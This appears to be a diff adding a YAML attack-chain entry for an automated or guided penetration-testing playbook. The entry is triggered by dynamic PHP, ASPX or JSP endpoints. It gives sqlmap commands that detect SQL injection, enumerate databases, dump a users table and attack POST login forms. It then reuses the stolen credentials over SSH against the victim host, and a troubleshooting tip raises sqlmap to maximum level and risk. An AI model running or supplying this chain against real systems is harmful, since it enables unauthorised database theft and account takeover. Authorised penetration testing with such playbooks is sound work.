@@ -1,0 +1,47 @@
+chain_id: sqli_with_sqlmap
+title: "SQL injection — sqlmap dump and credential reuse"
+severity: HIGH
+tags: [web, sqli, sqlmap, database, credential-reuse]
+
+trigger:
+  any_of:
+    - { path_pattern: "\\.(php|aspx|jsp)$" }
+    - { path_pattern: "(?i)/(login|index|product|article|page|user|profile)\\." }
+
+description: |
+  Dynamic web endpoint (.php / .aspx / .jsp) discovered. sqlmap is the first
+  tool of choice: it auto-detects injectable parameters, dumps schemas, and
+  supports both GET and POST. Credentials harvested here often reuse on SSH.
+
+steps:
+  - id: 1
+    title: "Detection and DB enumeration"
+    command: sqlmap -u 'http://$VICTIMA/pagina.php?id=1' --dbs --batch
+
+  - id: 2
+    title: "List tables of the interesting DB"
+    command: sqlmap -u 'http://$VICTIMA/pagina.php?id=1' -D nombre_db --tables --batch
+
+  - id: 3
+    title: "Dump the users table"
+    command: sqlmap -u 'http://$VICTIMA/pagina.php?id=1' -D nombre_db -T users --dump --batch
+
+  - id: 4
+    title: "Variant for POST login forms"
+    command: sqlmap -u 'http://$VICTIMA/login.php' --data='user=test&pass=test' --dbs --batch
+
+  - id: 5
+    title: "Try the obtained credentials on other services (SSH)"
+    command: ssh USUARIO@$VICTIMA
+    notes: |
+      Credentials obtained via SQLi often work on SSH if the user reuses
+      passwords across services.
+
+common_errors:
+  - error: "All tested parameters do not appear to be injectable"
+    solution: |
+      Raise level and risk: sqlmap -u '...' --level=5 --risk=3 --dbs --batch
+
+references:
+  - https://github.com/sqlmapproject/sqlmap
+  - https://book.hacktricks.xyz/pentesting-web/sql-injection
